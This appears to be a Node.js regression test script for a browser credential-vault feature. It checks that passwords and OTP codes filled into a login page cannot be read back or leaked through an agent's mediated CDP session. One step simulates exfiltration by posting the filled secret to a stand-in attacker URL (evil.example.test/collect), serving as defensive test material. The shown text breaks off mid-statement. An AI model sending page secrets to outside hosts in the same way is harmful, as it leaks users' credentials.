#!/usr/bin/env node
/**
 * Round 28 regression nails for `vault-login` (`go-r28` + Property 4 addendum):
 *   - R28-1a: Rule 1 + Rule 3 — Full-window read fence from the instant `fillVaultField` enters the tab
 *     (before `onBeforeInsert` / `Input.insertText`) across `vsst_`, `jbt_`, `vsak_`, `/direct screenshot`,
 *     and inbound `cdp-mediator` calls (`409 login_fill_live` with wait-for-submit guidance).
 *   - R28-1b: Point 1 clean recovery — Failed or cancelled fill with no value left on the page clears the
 *     fence immediately (both pre-insert `target_not_found` and post-`onBeforeInsert` `Input.insertText`
 *     CDP error when `verifiedEmpty === true` and 0 cred requests left), never leaving an unreadable tab.
 *   - R28-2: Rule 2 — In-flight mediated CDP reads (`W0` pre-fill `Runtime.evaluate(awaitPromise: true)`
 *     polling 6-digit `#otp` and char-split `Array.from(#pw.value).join(':')`) never deliver a result to
 *     the caller (`[login_fill_live]`), send ZERO `Runtime.terminateExecution` calls upstream, and leave
 *     the login page's own background scripts/timers undisturbed.
 *   - R28-3: Point 3 — Pre-planted page timer firing while secret is on the page cannot exfiltrate via
 *     `Runtime.consoleAPICalled`, `Runtime.exceptionThrown`, `Log.entryAdded`, `Audits.issueAdded`, or any
 *     read verb.
 *   - R28-4: Point 4 — Submit-time credential request body never appears in the agent's mediated CDP
 *     session (`Network.requestWillBeSent` / `Fetch.requestPaused` `postData` & shifted `postDataEntries`,
 *     `Network.requestWillBeSentExtraInfo`, `Network.getRequestPostData`, `Fetch.getRequestPostData`,
 *     `Network.replayXHR`, `Tracing.start` / `Tracing.dataCollected` / `Tracing.tracingComplete` / `IO.read`),
 *     both DURING fill and AFTER submit navigation lifts the fence (including `< 8`-byte 6-digit OTPs).
 *   - R28-5a: Driver 2 Group 1 + `3L` — `Target.getTargetInfo` error/timeout, `DOM.describeNode` error/timeout,
 *     and first-alias short-socket `Accessibility.queryAXTree` error (`queryCalls === 1`) fail closed
 *     (`409 target_not_found`, `0` `Input.insertText`).
 *   - R28-5b: Driver 2 Group 2 + Extra SPA Nail — Watch disconnect mid-`DOM.describeNode` stashes `@ref`
 *     `specs` and relocates `@e2` on same-URL reconnect (`200`), reports expired snapshot + `snapshot -i`
 *     on URL change (`409 target_not_found`), and refuses `409 login_bad_field` with `0` `Input.insertText`
 *     when an SPA swaps `<input type="password">` -> `<input type="text">` without changing URL (+ MUTANT 34).
 *   - R28-5c: Driver 2 Group 3 — `--generate` change & `new:` register roll back `(name, rev)` `pending` +
 *     For-you card on `Input.insertText` CDP error when `verifiedEmpty === true` so immediate retry returns
 *     `200`, while `Input.insertText` timeout stays fail-closed with actionable `/pending` / discard guidance.
 *   - R28-6a: Property 4 `4-1` — First fill = 6-digit OTP (entry also has `>= 8`-byte password) -> `vault.lock()`
 *     -> watch reconnect (`rearmLoginFences`) -> ceiling expiry / same-origin submit: 0 OTP chars readable.
 *   - R28-6b: Property 4 `4-2` — Tab 1 caches another site's `>= 8`-byte password while never-filled Tab 2
 *     fills `< 8`-byte short password -> Hub restart -> `vault.lock()` -> watch reconnect -> ceiling
 *     expiry: `scrubValuesForLogin` isolates by `loginId` and Shape S holds fail-closed until navigation.
 *   - R28-6c: 3 True First-Fill Child-Process Scenarios (`long` >= 8B password, `short` < 8B password, `otp`
 *     6-digit code) — each in a fresh `node` child process with 0 prior fills and 0 `clear*` helpers, plus
 *     never-unlocked second-process boot verification.
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import crypto from 'node:crypto';
import { spawn } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';

// B-21cc (the coordinator's r2491): a vault fill acts on the session's CURRENT tab, which the keeper reads from the session's own
// `tab list` (the row marked active). These worlds have no driver session, so each watch made here gets a keeper whose
// `currentTabOf` answers the tab that watch's scene made current (`noteActiveTab`, on the watch or through the route), and refuses
// by name when none was made current — never a guess. Every other keeper member is the world's own.
function withCurrentTab(DmMod) {
  return { ...DmMod, create(opts = {}) {
    const cur = new Map();
    const k0 = opts.keeper || null;
    const keeper = k0 ? Object.assign({}, k0, { currentTabOf: async ({ profileId = '', browserKey = '' } = {}) => { const id = cur.get(String(profileId || '') + '|' + String(browserKey || '')); return id ? { ok: true, targetId: id } : { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (this world made none current) — nothing was filled; try again' }; } }) : k0;
    const d = DmMod.create({ ...opts, keeper });
    const n0 = d.noteActiveTab;
    if (typeof n0 === 'function') d.noteActiveTab = (t, id) => { if (t && id) cur.set(String(t.profileId || '') + '|' + String(t.browserKey || ''), String(id)); return n0(t, id); };
    return d;
  } };
}

const SELF_PATH = fileURLToPath(import.meta.url);
const quiet = { log() {}, warn() {}, error() {} };

async function startKernelRelay(fk) {
  const { WebSocketServer, WebSocket } = createRequire(import.meta.url)('ws');
  const state = {
    upstreamCalls: [],
    hook: null, // (msg, { sendToClient, closeClient, upWs }) => true (handled) | Promise | false
    attachedByTarget: new Map(), // targetId -> Set<{ clientWs, sessionId }>
  };
  let relayPort = 0;
  const relayHttp = http.createServer((req, res) => {
    http.get({ host: '127.0.0.1', port: fk.port, path: req.url }, (upRes) => {
      let body = '';
      upRes.setEncoding('utf8');
      upRes.on('data', (d) => { body += d; });
      upRes.on('end', () => {
        const rewritten = body.replaceAll(`127.0.0.1:${fk.port}`, `127.0.0.1:${relayPort}`);
        res.writeHead(upRes.statusCode || 200, { 'Content-Type': 'application/json' });
        res.end(rewritten);
      });
    }).on('error', () => {
      res.writeHead(502);
      res.end();
    });
  });
  const wss = new WebSocketServer({ noServer: true });
  relayHttp.on('upgrade', (req, sock, head) => {
    const upUrl = `ws://127.0.0.1:${fk.port}${req.url}`;
    const upWs = new WebSocket(upUrl);
    upWs.once('open', () => {
      wss.handleUpgrade(req, sock, head, (clientWs) => {
        const sendToClient = (obj) => {
          if (clientWs.readyState === WebSocket.OPEN) {
            try { clientWs.send(JSON.stringify(obj)); } catch { /* gone */ }
          }
        };
        const closeClient = () => {
          try { clientWs.terminate(); } catch { /* gone */ }
        };
        upWs.on('message', (raw) => {
          const str = String(raw);
          try {
            const m = JSON.parse(str);
            if (m.method === 'Target.attachedToTarget' && m.params?.sessionId && m.params?.targetInfo?.targetId) {
              const tid = m.params.targetInfo.targetId;
              if (!state.attachedByTarget.has(tid)) state.attachedByTarget.set(tid, new Set());
              state.attachedByTarget.get(tid).add({ clientWs, sessionId: m.params.sessionId });
            }
          } catch { /* forward raw */ }
          if (clientWs.readyState === WebSocket.OPEN) {
            try { clientWs.send(str); } catch { /* gone */ }
          }
        });
        upWs.on('close', () => { try { clientWs.close(); } catch { /* gone */ } });
        clientWs.on('close', () => {
          for (const set of state.attachedByTarget.values()) {
            for (const row of [...set]) if (row.clientWs === clientWs) set.delete(row);
          }
          try { upWs.close(); } catch { /* gone */ }
        });
        clientWs.on('message', async (raw) => {
          const str = String(raw);
          let m = null;
          try { m = JSON.parse(str); } catch { m = null; }
          if (m && m.method) {
            state.upstreamCalls.push({ id: m.id, method: m.method, sessionId: m.sessionId || null, params: m.params || {} });
          }
          if (m && typeof state.hook === 'function') {
            const hRes = await state.hook(m, { sendToClient, closeClient, upWs });
            if (hRes === true) return;
          }
          if (upWs.readyState === WebSocket.OPEN) {
            try { upWs.send(str); } catch { /* gone */ }
          }
        });
      });
    });
    upWs.on('error', () => { try { sock.destroy(); } catch { /* gone */ } });
  });
  await new Promise((r) => relayHttp.listen(0, '127.0.0.1', r));
  relayPort = relayHttp.address().port;
  const wsPath = new URL(fk.wsUrl).pathname;
  return {
    port: relayPort,
    wsUrl: `ws://127.0.0.1:${relayPort}${wsPath}`,
    state,
    emitTargetEvent(targetId, method, params) {
      const set = state.attachedByTarget.get(targetId);
      let count = 0;
      if (!set) return 0;
      for (const { clientWs, sessionId } of [...set]) {
        if (clientWs.readyState === WebSocket.OPEN) {
          try {
            clientWs.send(JSON.stringify({ method, params, sessionId }));
            count++;
          } catch { /* gone */ }
        }
      }
      return count;
    },
    dropClientSockets() {
      for (const ws of wss.clients) {
        try { ws.terminate(); } catch { /* gone */ }
      }
    },
    async close() {
      for (const ws of wss.clients) { try { ws.terminate(); } catch { /* gone */ } }
      await new Promise((r) => relayHttp.close(() => r()));
    },
  };
}

async function openMediatedCdpSession(WebSocket, cdpUrl, targetId) {
  const ws = new WebSocket(cdpUrl);
  await new Promise((res, rej) => {
    ws.once('open', res);
    ws.once('error', rej);
  });
  let seq = 0;
  const pending = new Map();
  const events = [];
  ws.on('message', (raw) => {
    let m;
    try { m = JSON.parse(String(raw)); } catch { return; }
    if (Number.isInteger(m.id) && pending.has(m.id)) {
      const r = pending.get(m.id);
      pending.delete(m.id);
      r(m);
    } else if (m.method) {
      events.push(m);
    }
  });
  const call = (method, params = {}, sessionId = undefined) => new Promise((resolve) => {
    const id = ++seq;
    pending.set(id, resolve);
    ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
  });
  const att = await call('Target.attachToTarget', { targetId, flatten: true });
  const sid = att.result?.sessionId || null;
  return {
    ws,
    sid,
    events,
    call,
    close() { try { ws.close(); } catch { /* gone */ } },
  };
}

async function runColdLockedPair(repoDir, kind, { control = false } = {}) {
  const { startFakeKernel } = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/fake-kernel.mjs')).href);
  const ORIGIN = 'https://firstfill.example.test';
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), `vs-r28-coldpair-${kind}-`));
  const dataDir = path.join(tmpRoot, 'data');
  fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
  const fk = await startFakeKernel({
    firstUrl: `${ORIGIN}/login`,
    mode: { standard: true, omitFilledPassword: true },
  });
  const tid = fk.targets()[0].targetId;
  fk.setDom(tid, {
    url: `${ORIGIN}/login`,
    elements: [
      { id: 'u', tag: 'input', type: 'email', name: 'Username' },
      { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
      { id: 'otp', tag: 'input', type: 'text', name: 'Verification code' },
    ],
  });
  try {
    const runStep = (step, extraArgs = [], extraEnv = {}) => new Promise((resolve) => {
      const xdg = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-r28-cxdg-'));
      const c = spawn(
        process.execPath,
        [SELF_PATH, `--repo=${repoDir}`, `--first-fill-worker=${kind}`, `--worker-mode=${step}`, `--data-dir=${dataDir}`, `--ws-url=${fk.wsUrl}`, ...extraArgs],
        { env: { ...process.env, XDG_RUNTIME_DIR: xdg, VIBESPACE_SKIP_AGENT_HOOKS: '1', ...extraEnv } },
      );
      let out = '', err = '';
      c.stdout.on('data', (d) => { out += d; });
      c.stderr.on('data', (d) => { err += d; });
      c.on('close', (code) => {
        fs.rmSync(xdg, { recursive: true, force: true });
        let parsed = null;
        try { parsed = JSON.parse(out.trim().split('\n').pop() || '{}'); } catch { parsed = { ok: false, out, err }; }
        resolve({ exitCode: code, ...parsed });
      });
    });
    // r2913 RED CONTROL: THE RACE, PLACED — the store writer's rename of the keeper's registry is HELD (a preload, in its worker thread
    // only, waiting while a flag file exists) and the stand-in keeper has NO landing wait: the fill types, answers 200 and its child
    // exits at once with the record still held in the writer; the flag goes only after that child closed. Never made by load.
    let stallEnv = {}, stallFlag = null;
    if (control) {
      stallFlag = path.join(tmpRoot, 'stall.flag'); fs.writeFileSync(stallFlag, '1');
      const pre = path.join(tmpRoot, 'stall-rename.cjs');
      fs.writeFileSync(pre, [
        "'use strict';",
        "const fs = require('fs'), wt = require('worker_threads');",
        "const FLAG = process.env.R28_STALL_FLAG;",
        "if (FLAG && !wt.isMainThread) { const o = fs.renameSync; fs.renameSync = function (a, b) { if (String(b).endsWith('browser-profiles.json')) { const sab = new Int32Array(new SharedArrayBuffer(4)); const t0 = Date.now(); while (fs.existsSync(FLAG) && Date.now() - t0 < 20000) Atomics.wait(sab, 0, 0, 20); } return o.apply(this, arguments); }; }",
      ].join(String.fromCharCode(10)));
      stallEnv = { NODE_OPTIONS: `--require ${pre}`, R28_STALL_FLAG: stallFlag };
    }
    const fillStep = await runStep('cold-step1-fill', control ? ['--no-landing-wait'] : [], stallEnv);
    if (stallFlag) fs.rmSync(stallFlag, { force: true });
    if (!fillStep.ok || !fillStep.pid) return { ok: false, kind, stage: 'step1', fillStep };
    // r3317 (B-3dbd unit 2): AT A RED the facts that place it, no values — the fences on disk BETWEEN the two processes
    const fencesBetween = (() => { try { const j = JSON.parse(fs.readFileSync(path.join(dataDir, 'browser-profiles.json'), 'utf8')); return Object.values(j.loginFences || {}).reduce((n, v) => n + ((v && Array.isArray(v.fences)) ? v.fences.length : 0), 0); } catch (e) { return `unread (${(e && e.code) || 'error'})`; } })();
    const bootStep = await runStep('cold-step2-locked', [`--pid=${fillStep.pid}`, `--secret=${fillStep.secret}`]);
    const { secret: _secret, ...fillFacts } = fillStep;   // the made-up secret is never in what a red prints
    return { ok: bootStep.ok === true, kind, fillStep: fillFacts, fencesBetween, bootStep };
  } finally {
    await fk.close();
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
}

async function runFirstFillWorker(repoDir, kind, mode, extOpts = {}) {
  const req = createRequire(path.join(repoDir, 'package.json'));
  const express = req('express');
  const { WebSocket } = req('ws');
  const BL = req('./src/browser-login.js');
  const BM = req('./src/browser-mediation.js');
  const VE = req('./src/server/vault-engine.js');
  const GS = req('./src/server/grants-store.js');
  const BK = req('./src/server/browser-keeper.js');
  const Lm = req('./src/server/browser-logins.js');
  const Dm = withCurrentTab(req('./src/server/browser-dialogs.js')); // B-21cc: each watch's keeper answers its current tab
  const CM = req('./src/server/cdp-mediator.js');
  const Rm = req('./src/routes/browser.js');
  const { startFakeKernel } = await import(pathToFileURL(path.join(repoDir, 'scripts/fixtures/fake-kernel.mjs')).href);

  const ownTmp = !extOpts.dataDir;
  const tmpRoot = extOpts.dataDir ? path.dirname(extOpts.dataDir) : fs.mkdtempSync(path.join(os.tmpdir(), `vs-r28-firstfill-${kind}-`));
  const dataDir = extOpts.dataDir || path.join(tmpRoot, 'data');
  fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });

  const ORIGIN = 'https://firstfill.example.test';
  const USER = 'alice';
  const LONG_PW = 'FirstLongPw!2026_R28';
  const SHORT_PW = 'Sh!7';
  const OTP_CODE = '482910';
  const SECRET = extOpts.secret || (kind === 'long' ? LONG_PW : kind === 'short' ? SHORT_PW : OTP_CODE);
  const TARGET_SEL = kind === 'otp' ? '#otp' : '#pw';
  const SPEC = kind === 'otp'
    ? 'firstfill.example.test#alice/otp'
    : 'firstfill.example.test#alice/password';

  let clock = 1_760_000_000_000;
  let fk = null;
  const ownFk = !extOpts.wsUrl;
  let mediator = null;
  let srv = null;
  let dialogs1 = null;
  let dialogs2 = null;
  let vault1 = null;
  let vault2 = null;

  try {
    let wsEndpoint = extOpts.wsUrl || '';
    let tid = '';
    if (ownFk) {
      fk = await startFakeKernel({
        firstUrl: `${ORIGIN}/login`,
        mode: { standard: true, omitFilledPassword: true },
      });
      tid = fk.targets()[0].targetId;
      fk.setDom(tid, {
        url: `${ORIGIN}/login`,
        elements: [
          { id: 'u', tag: 'input', type: 'email', name: 'Username' },
          { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
          { id: 'otp', tag: 'input', type: 'text', name: 'Verification code' },
          { id: 'synced_hidden', tag: 'input', type: 'hidden', name: 'synced' },
        ],
      });
      wsEndpoint = fk.wsUrl;
    } else {
      const u = new URL(wsEndpoint.replace(/^ws/, 'http'));
      const listRes = await fetch(`${u.origin}/json/list`);
      const listJson = await listRes.json();
      tid = listJson[0].id;
    }

    const keeperReal = BK.create({
      rootDir: dataDir,
      dataDir,
      profilesRoot: path.join(dataDir, 'profiles'),
      runtimeRoot: path.join(dataDir, 'run'),
      log: quiet,
      launchImpl: async () => { throw new Error('no launch'); },
    });
    const prof = extOpts.pid
      ? (keeperReal.profile(extOpts.pid) || { id: extOpts.pid, label: 'FFProfile' })
      : keeperReal.createProfile({ label: 'FFProfile' }, { owner: { kind: 'instance', id: null } });
    const PID = prof.id;
    const KEY = 'bk-0000ff01';
    const SID = 'sess-ff-1';
    const TOKEN = 'vsst_' + crypto.randomBytes(16).toString('hex');

    mediator = CM.create({ log: quiet });
    await mediator.listen();
    const medGrant = await mediator.grantFor({
      profileId: PID,
      browserKey: KEY,
      upstream: wsEndpoint,
      targetIds: [tid],
      mode: 'scope',
    });

    if (mode === 'cold-step2-locked') {
      const tBoot = Date.now();   // r3317: the cold boot's own clock (its times said at a red)
      // Brand-new OS process #2: vault is NEVER unlocked, LF memory is 100% empty!
      vault2 = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
      const grants2 = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins2 = Lm.create({
        vault: vault2,
        grants: () => grants2,
        totpCode: () => ({ ok: false, code: 'vault_locked' }),
        forYou: { add: () => 'fy-2', resolve: () => {} },
        now: () => clock,
        log: quiet.log,
      });
      const stubKeeper2 = {
        clock: () => clock,
        profile: (id) => (id === PID ? prof : null),
        profileByRef: (r) => (r === PID || r === 'ff' ? prof : null),
        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'ff', attachment: { profileId: PID, alias: 'ff', isDefault: true }, handles: [{ handle: 'ff', kind: 'attachment', profileId: PID, isDefault: true }], isDefault: true }),
        attach: async () => ({ ok: true, profile: prof, browser: { state: 'running' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: medGrant.url, env: [] }),
        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'ff', isDefault: true }] }),
        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'ff', label: 'FFProfile', isDefault: true }], handles: [{ handle: 'ff', kind: 'attachment', profileId: PID, isDefault: true }] }),
        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
        inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
        ephemeralFor: () => null,
        audit() {},
        tell() {},
        bootstrapTabRoot: async () => {},
        noteLeaseUrl() {},
        onLease: () => () => {},
        socketRootOf: () => ({ socketDir: path.join(tmpRoot, 'sock'), runtimeDir: tmpRoot }),
        configFileFor: () => null,
        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: wsEndpoint } : { ok: false }),
        mediator: () => mediator,
        saveLoginFenceState: (id, st) => keeperReal.saveLoginFenceState(id, st),
        // r2913: the real keeper's landing wait, carried — the fill types only once the tab's fence record is on disk, as in the product
        ...(extOpts && extOpts.noLandingWait ? {} : { whenLanded: (o) => keeperReal.whenLanded(o) }),
        loginFenceStateOf: (id) => keeperReal.loginFenceStateOf(id),
        loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => BM.loginFillChannelVerdict(
          BM.leaseRoadVerdict({ mediated: false, proxy: Boolean(mediator), ephemeral: Boolean(ephemeral), remoteSession: Boolean(remoteSession), agent: true }),
          { proxy: Boolean(mediator), external: false, remote: false, remoteSession: Boolean(remoteSession), hasCdp: Boolean(wsEndpoint), usableProfiles: [prof.label], profileLabel: prof.label, action },
        ),
      };
      dialogs2 = Dm.create({
        keeper: stubKeeper2,
        logins: logins2,
        now: () => clock,
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
        labelOf: () => 'FFProfile',
        takeoverOf: () => false,
        conversationOf: () => ({ cid: 'conv-ff-1', name: 'FF Agent' }),
        isVaultLocked: () => vault2.state() !== 'unlocked',
        log: quiet,
      });
      const sessions2 = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'FF Agent', cwd: tmpRoot, backendSessionId: 'conv-ff-1' }]]);
      Rm.setup({ keeper: stubKeeper2, activeSessions: sessions2, dialogs: dialogs2, logins: logins2, tasksForSession: () => [] });
      const app2 = express();
      app2.use(express.json());
      app2.use(Rm.router);
      srv = http.createServer(app2);
      await new Promise((r) => srv.listen(0, '127.0.0.1', r));
      const API2 = `http://127.0.0.1:${srv.address().port}`;
      const post2 = async (p, body) => {
        const r = await fetch(API2 + p, {
          method: 'POST',
          headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
          body: JSON.stringify(body),
        });
        return { status: r.status, json: await r.json() };
      };
      const armed = await dialogs2.arm(PID); const armMs = Date.now() - tBoot;
      dialogs2.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
      dialogs2.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);

      clock += 16 * 60_000;
      await post2('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', TARGET_SEL], targetId: tid });
      await new Promise((r) => setTimeout(r, 35));
      const readHeld = await post2('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', TARGET_SEL], targetId: tid });
      const readMs = Date.now() - tBoot;
      // which road answered, by the refusal's own words (never a value): «restarted while…» = the fences restored from the record,
      // «can no longer verify…» = the record's road before the restore, nothing = no fence answered (the read went through)
      const errOf = (r) => String((r && r.json && (r.json.error || r.json.message)) || '');
      const road = readHeld.status === 409 ? (/restarted while a filled login secret/.test(errOf(readHeld)) ? 'the fences restored (await_vault)' : /can no longer verify/.test(errOf(readHeld)) ? 'the record before the restore (unknown_typed)' : 'a refusal: ' + (readHeld.json && readHeld.json.code)) : `no fence answered (${readHeld.status})`;
      const med2 = await openMediatedCdpSession(WebSocket, medGrant.url, tid);
      const medHeld = await med2.call('Runtime.evaluate', { expression: '1+1', returnByValue: true }, med2.sid);
      med2.close();
      return {
        ok: readHeld.status === 409 && readHeld.json?.code === 'login_fill_live'
          && Boolean(medHeld.error && /login_fill_live/.test(medHeld.error.message || '')),
        kind,
        mode,
        readHeldStatus: readHeld.status,
        armed: { ok: !!(armed && armed.ok), watched: !!(armed && armed.watched), code: (armed && armed.code) || null }, road, armMs, readMs,
        readHeldCode: readHeld.json?.code || null,
        medHeldErr: medHeld.error?.message || null,
      };
    }

    vault1 = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
    await vault1.setup('VaultFirstFill!2026');
    const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
    if (kind === 'otp') vault1.secretPut('totp:ff-2fa', 'JBSWY3DPEHPK3PXP');

    const logins1 = Lm.create({
      vault: vault1,
      grants: () => grants,
      totpCode: (n) => (n === 'ff-2fa' ? { ok: true, code: OTP_CODE } : { ok: false, code: 'no_totp' }),
      forYou: { add: () => 'fy-1', resolve: () => {} },
      now: () => clock,
      log: quiet.log,
    });
    logins1.addOwn({
      origin: ORIGIN,
      username: USER,
      password: kind === 'short' ? SHORT_PW : LONG_PW,
      ...(kind === 'otp' ? { totpName: 'ff-2fa' } : {}),
    }, { who: 'owner' });
    grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'conversation', key: 'conv-ff-1' }], except: [] });

    let activeVault = vault1;
    const makeStubKeeper = () => ({
      clock: () => clock,
      profile: (id) => (id === PID ? prof : null),
      profileByRef: (r) => (r === PID || r === 'ff' ? prof : null),
      resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'ff', attachment: { profileId: PID, alias: 'ff', isDefault: true }, handles: [{ handle: 'ff', kind: 'attachment', profileId: PID, isDefault: true }], isDefault: true }),
      attach: async () => ({ ok: true, profile: prof, browser: { state: 'running' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: medGrant.url, env: [] }),
      statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'ff', isDefault: true }] }),
      setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'ff', label: 'FFProfile', isDefault: true }], handles: [{ handle: 'ff', kind: 'attachment', profileId: PID, isDefault: true }] }),
      leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
      inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
      ephemeralFor: () => null,
      audit() {},
      tell() {},
      bootstrapTabRoot: async () => {},
      noteLeaseUrl() {},
      onLease: () => () => {},
      socketRootOf: () => ({ socketDir: path.join(tmpRoot, 'sock'), runtimeDir: tmpRoot }),
      configFileFor: () => null,
      cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: wsEndpoint } : { ok: false }),
      mediator: () => mediator,
      saveLoginFenceState: (id, st) => keeperReal.saveLoginFenceState(id, st),
      // r2913: the real keeper's landing wait, carried — the fill types only once the tab's fence record is on disk, as in the product
      ...(extOpts && extOpts.noLandingWait ? {} : { whenLanded: (o) => keeperReal.whenLanded(o) }),
      loginFenceStateOf: (id) => keeperReal.loginFenceStateOf(id),
      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => BM.loginFillChannelVerdict(
        BM.leaseRoadVerdict({ mediated: false, proxy: Boolean(mediator), ephemeral: Boolean(ephemeral), remoteSession: Boolean(remoteSession), agent: true }),
        { proxy: Boolean(mediator), external: false, remote: false, remoteSession: Boolean(remoteSession), hasCdp: Boolean(wsEndpoint), usableProfiles: [prof.label], profileLabel: prof.label, action },
      ),
    });

    const stubKeeper = makeStubKeeper();
    dialogs1 = Dm.create({
      keeper: stubKeeper,
      logins: logins1,
      now: () => clock,
      holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
      leaseCountOf: () => 1,
      labelOf: () => 'FFProfile',
      takeoverOf: () => false,
      conversationOf: () => ({ cid: 'conv-ff-1', name: 'FF Agent' }),
      isVaultLocked: () => activeVault.state() !== 'unlocked',
      log: quiet,
    });
    vault1.onLock(() => { try { dialogs1.onVaultLock?.(); } catch { /* optional */ } });

    const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'FF Agent', cwd: tmpRoot, backendSessionId: 'conv-ff-1' }]]);
    Rm.setup({ keeper: stubKeeper, activeSessions: sessions, dialogs: dialogs1, logins: logins1, tasksForSession: () => [] });
    const app = express();
    app.use(express.json());
    app.use(Rm.router);
    srv = http.createServer(app);
    await new Promise((r) => srv.listen(0, '127.0.0.1', r));
    const API = `http://127.0.0.1:${srv.address().port}`;
    const post = async (p, body) => {
      const r = await fetch(API + p, {
        method: 'POST',
        headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
        body: JSON.stringify(body),
      });
      return { status: r.status, json: await r.json() };
    };

    await dialogs1.arm(PID);
    dialogs1.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
    dialogs1.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);

    // THE SINGLE FIRST FILL IN THIS FRESH OS PROCESS (0 prior fills, 0 clear* helpers!)
    const fillRes = await post('/api/agent/browser/fill-vault', {
      profile: PID,
      target: TARGET_SEL,
      spec: SPEC,
      targetId: tid,
    });
    if (mode === 'cold-step1-fill') {
      return { ok: fillRes.status === 200, pid: PID, secret: SECRET, fillStatus: fillRes.status };
    }
    const domAfterFill = fk.readDomValues(tid);
    const fieldId = TARGET_SEL.slice(1);
    if (fillRes.status !== 200 || domAfterFill[fieldId] !== SECRET) {
      return { ok: false, stage: 'fill', fillRes, domAfterFill };
    }
    // Simulate standard React / split-OTP form syncing the typed field into `<input type="hidden" id="synced_hidden">`
    {
      const syncWs = new WebSocket(wsEndpoint);
      await new Promise((r) => syncWs.once('open', r));
      const sc = (id, method, params, sessionId) => new Promise((r) => {
        const fn = (d) => { const m = JSON.parse(String(d)); if (m.id === id) { syncWs.off('message', fn); r(m); } };
        syncWs.on('message', fn);
        syncWs.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
      });
      const sa = await sc(1, 'Target.attachToTarget', { targetId: tid, flatten: true });
      const sw = await sc(2, 'Page.createIsolatedWorld', { frameId: tid, worldName: 'form-sync' }, sa.result.sessionId);
      await sc(3, 'Runtime.evaluate', {
        contextId: sw.result.executionContextId,
        expression: `(() => { const h = document.querySelector('#synced_hidden'); const v = document.querySelector(${JSON.stringify(TARGET_SEL)}).value; h.value = v; h.defaultValue = v; h.setAttribute('value', v); return true; })()`,
        returnByValue: true,
      }, sa.result.sessionId);
      syncWs.close();
    }

    // Lock vault immediately after the first fill, advance past 15-min ceiling, then drop & reconnect watch socket (`rearmLoginFences` while locked)
    vault1.lock();
    // 1) Readback refused & cross-origin exfil blocked while locked before ceiling
    const readMid = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', TARGET_SEL], targetId: tid });
    const medSession = await openMediatedCdpSession(WebSocket, medGrant.url, tid);
    const medEvalMid = await medSession.call('Runtime.evaluate', { expression: `document.querySelector(${JSON.stringify(TARGET_SEL)}).value`, returnByValue: true }, medSession.sid);
    medSession.close();
    const exfilOut = await fk.simulateSubmitRequest(tid, {
      url: 'https://evil.example.test/collect',
      method: 'POST',
      postData: `v=${encodeURIComponent(SECRET)}`,
      resourceType: 'Fetch',
    });

    // 2) Advance clock past 15-min ceiling + watch reconnect (`rearmLoginFences` hits `now() - f.at >= liveFillMaxMs` while locked!):
    //    Must EITHER wipe input empty OR keep fence 409 (`vault_locked`), NEVER drop fence with secret still in DOM!
    clock += 16 * 60_000;
    fk.dropSockets();
    await new Promise((r) => setTimeout(r, 30));
    await dialogs1.arm(PID);
    await new Promise((r) => setTimeout(r, 40));
    const readAfterWipe = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', TARGET_SEL], targetId: tid });
    const domEnd = fk.readDomValues(tid);
    const valStillOnPage = domEnd[fieldId] === SECRET || domEnd.synced_hidden === SECRET;
    const safeAfterCeiling = !valStillOnPage || (readAfterWipe.status === 409 && readAfterWipe.json?.code === 'login_fill_live');
    return {
      ok: readMid.status === 409 && readMid.json?.code === 'login_fill_live'
